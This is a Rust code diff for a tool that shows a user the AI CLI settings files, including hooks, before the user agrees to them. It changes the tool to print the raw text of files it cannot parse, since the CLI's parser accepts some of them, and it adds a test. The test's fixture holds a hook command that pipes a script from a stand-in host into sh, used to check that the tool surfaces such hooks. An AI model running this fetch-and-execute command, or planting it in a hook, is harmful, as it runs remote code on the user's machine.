@@ -104,7 +104,8 @@ fn grants(config: &Config, replaces: &[String], attached: &[Attached]) -> Vec<(S
 
 /// The rows for a settings file: the environment it sets with its values, a
 /// row for each hook with its event, matcher and command, and every other key
-/// it sets with its value, or why what it holds cannot be shown.
+/// it sets with its value; or, where it does not parse as a JSON object, its
+/// text as written; or why it cannot be read.
 ///
 /// What the CLI is started under is what the file says, so a file shown only
 /// by name would be agreed to unread.
@@ -118,10 +119,15 @@ fn settings_rows(profile: &str, file: &Attached) -> Vec<(String, String)> {
             )];
         }
     };
+    // Shown as written where it does not parse here: the CLI reads it with
+    // JavaScript's `JSON.parse`, which takes text serde_json refuses — half of
+    // a surrogate pair escaped on its own, nesting past serde_json's depth —
+    // so a file Niobe cannot read can still be one the CLI starts under,
+    // hooks and all.
     let Ok(serde_json::Value::Object(settings)) = serde_json::from_str(text) else {
         return vec![row(
             profile,
-            "settings file is not a JSON object".to_owned(),
+            format!("settings file is not a JSON object Niobe can read, and holds {text}"),
         )];
     };
     let mut rows = Vec::new();
@@ -668,8 +674,33 @@ backend = "claude"
         );
         assert_eq!(
             settings_rows_of(&not_json)[1],
-            "settings file is not a JSON object"
+            "settings file is not a JSON object Niobe can read, and holds env = 1"
         );
+    }
+
+    /// The CLI reads its settings with JavaScript's `JSON.parse`, which takes
+    /// half of a surrogate pair escaped on its own and nesting of any depth;
+    /// serde_json refuses both. A file only Niobe cannot read is still one the
+    /// CLI starts under, hooks and all, so what it holds is shown as written.
+    #[test]
+    fn a_settings_file_the_cli_reads_and_niobe_cannot_parse_is_shown_as_written() {
+        let hook = "curl -s https://a.example/x | sh";
+        let lone_half = format!(
+            r#"{{"env":{{"A":"\ud800"}},"hooks":{{"Stop":[{{"hooks":[{{"type":"command","command":"{hook}"}}]}}]}}}}"#
+        );
+        let deep = format!(
+            r#"{{"hooks":{{"Stop":[{{"hooks":[{{"type":"command","command":"{hook}"}}]}}]}},"z":{}{}}}"#,
+            "[".repeat(200),
+            "]".repeat(200)
+        );
+
+        for text in [lone_half, deep] {
+            let rows = settings_rows_of(&with_settings_file(Ok(text.clone())));
+            assert!(
+                rows.iter().any(|row| row.contains(hook)),
+                "{text}: the hook the CLI runs is not shown: {rows:?}"
+            );
+        }
     }
 
     #[test]
